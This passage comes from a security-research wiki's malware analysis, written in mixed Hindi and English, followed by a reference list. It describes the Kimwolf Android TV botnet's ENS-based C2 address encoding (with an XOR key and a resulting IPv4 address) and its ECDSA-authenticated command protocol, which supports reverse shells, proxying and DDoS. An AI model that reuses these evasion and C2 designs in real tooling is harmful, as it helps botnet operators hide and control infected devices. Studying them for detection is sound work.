- Later builds add an ENS domain (`pawsatyou.eth`) whose resolver text key `"lol"` stores a benign-looking IPv6 (`fed0:5dec:...:1be7:8599`).
- The bot grabs the last four bytes (`1b e7 85 99`), XORs them with `0x93141715`, and interprets the result as an IPv4 C2 (`136.243.146.140`). Updating the ENS text record instantly rotates downstream C2s via the blockchain without touching DNS.

### TLS + ECDSA प्रमाणीकृत कमांड चैनल
- Traffic is encapsulated in wolfSSL with a custom framed protocol:
```go
struct Header {
Magic    [4]byte // e.g. "DPRK", "FD9177FF", "AD216CD4"
Reserved uint8   // 0x01
MsgType  uint8   // verb
MsgID    uint32
BodyLen  uint32
CRC32    uint32
}
```
- Bootstrap: बॉट दो खाली `MsgType=0 (register)` हेडर भेजता है। C2 `MsgType=1 (verify)` के साथ एक रैंडम challenge और ASN.1 DER **ECDSA** signature भेजता है। बॉट इसे एम्बेडेड SubjectPublicKeyInfo ब्लॉब के खिलाफ सत्यापित करते हैं; विफलता से सेशन समाप्त हो जाता है, जिससे हाईजैक/सिंकहोल किए गए C2 नोड फ़्लीट को tasking देने से रोके जाते हैं।
- Once verified, the bot sends a `MsgType=0` body carrying the operator-defined **group string** (e.g. `android-postboot-rt`). यदि समूह सक्षम है, तो C2 `MsgType=2 (confirm)` के साथ प्रतिक्रिया देता है, जिसके बाद tasking (MsgType 5–12) शुरू हो जाता है।
- Supported verbs include SOCKS-style TCP/UDP proxying (residential proxy monetization), reverse shell / single command exec, file read/write, और **Mirai-compatible DDoSBody** payloads (same `AtkType`, `Duration`, `Targets[]`, `Flags[]` layout).

## संदर्भ

- [Unit42 – Evolving Tactics of SLOW#TEMPEST: A Deep Dive Into Advanced Malware Techniques](https://unit42.paloaltonetworks.com/slow-tempest-malware-obfuscation/)
- SoTap: Lightweight in-app JNI (.so) behavior logger – [github.com/RezaArbabBot/SoTap](https://github.com/RezaArbabBot/SoTap)
- Strategies for Analyzing Native Code in Android Applications: Combining Ghidra and Symbolic Execution for Code Decryption and Deobfuscation – [revflash.medium.com](https://revflash.medium.com/strategies-for-analyzing-native-code-in-android-applications-combining-ghidra-and-symbolic-aaef4c9555df)
- Ghidra – [github.com/NationalSecurityAgency/ghidra](https://github.com/NationalSecurityAgency/ghidra)
- angr – [angr.io](https://angr.io/)
- JNI_OnLoad and invocation API – [docs.oracle.com](https://docs.oracle.com/javase/8/docs/technotes/guides/jni/spec/invocation.html#JNJI_OnLoad)
- RegisterNatives – [docs.oracle.com](https://docs.oracle.com/javase/8/docs/technotes/guides/jni/spec/functions.html#RegisterNatives)
- Tracing JNI Functions – [valsamaras.medium.com](https://valsamaras.medium.com/tracing-jni-functions-75b04bee7c58)
- Native Enrich: Scripting Ghidra and Frida to discover hidden JNI functions – [laripping.com](https://laripping.com/blog-posts/2021/12/20/nativeenrich.html)
- [Unit42 – AdaptixC2: A New Open-Source Framework Leveraged in Real-World Attacks](https://unit42.paloaltonetworks.com/adaptixc2-post-exploitation-framework/)
- KONNI-linked APT abuses Google Find Hub to wipe Android devices after Windows intrusion – [genians.co.kr](https://www.genians.co.kr/en/blog/threat_intelligence/android)
- Android Find My Device (Find Hub) – [google.com/android/find](https://www.google.com/android/find)
- RftRAT/RFTServer technical analysis – [asec.ahnlab.com](https://asec.ahnlab.com/en/59590/)
- HMAC background – [wikipedia.org/wiki/HMAC](https://en.wikipedia.org/wiki/HMAC)
- Kimwolf Android TV Botnet: ENS-Based C2 Evasion, TLS+ECDSA C2 Protocol, and Large-Scale Proxy/DDoS Operations – [blog.xlab.qianxin.com](https://blog.xlab.qianxin.com/kimwolf-botnet-en/)
- [Check Point Research – GachiLoader: Defeating Node.js Malware with API Tracing](https://research.checkpoint.com/2025/gachiloader-node-js-malware-with-api-tracing/)
- [Nodejs-Tracer – GitHub](https://github.com/CheckPointSW/Nodejs-Tracer)

{{#include ../../banners/hacktricks-training.md}}
